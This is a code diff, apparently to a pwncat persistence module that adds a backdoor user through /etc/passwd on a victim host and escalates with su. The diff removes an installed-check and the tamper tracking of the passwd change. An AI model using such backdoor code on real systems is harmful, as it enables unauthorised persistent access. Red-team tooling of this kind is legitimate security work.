@@ -1,6 +1,7 @@
 #!/usr/bin/env python3
 import crypt
 from typing import Optional
+from colorama import Fore
 
 import pwncat
 from pwncat.persist import PersistenceMethod, PersistenceError
@@ -17,10 +18,6 @@ class Method(PersistenceMethod):
     @property
     def system(self) -> bool:
         return True
-
-    def installed(self, user: Optional[str] = None):
-        pwncat.victim.reload_users()
-        return pwncat.victim.config["backdoor_user"] in pwncat.victim.users
 
     def install(self, user: Optional[str] = None):
 
@@ -48,9 +45,6 @@ class Method(PersistenceMethod):
                 filp.write(passwd_content)
         except (PermissionError, FileNotFoundError) as exc:
             raise PersistenceError(str(exc))
-
-        # Track this modification in our tamper as well
-        pwncat.victim.tamper.modified_file("/etc/passwd", added_lines=passwd[-1:])
 
         # Ensure user cache is up to date
         pwncat.victim.reload_users()
@@ -107,10 +101,6 @@ class Method(PersistenceMethod):
             pwncat.victim.tamper.remove(tamper)
 
     def escalate(self, user: Optional[str] = None) -> bool:
-
-        # We can always check this, so we might as well give it a try
-        if not self.installed(user):
-            return False
 
         # First, escalate to the backdoor user
         pwncat.victim.run(f"su {pwncat.victim.config['backdoor_user']}", wait=False)
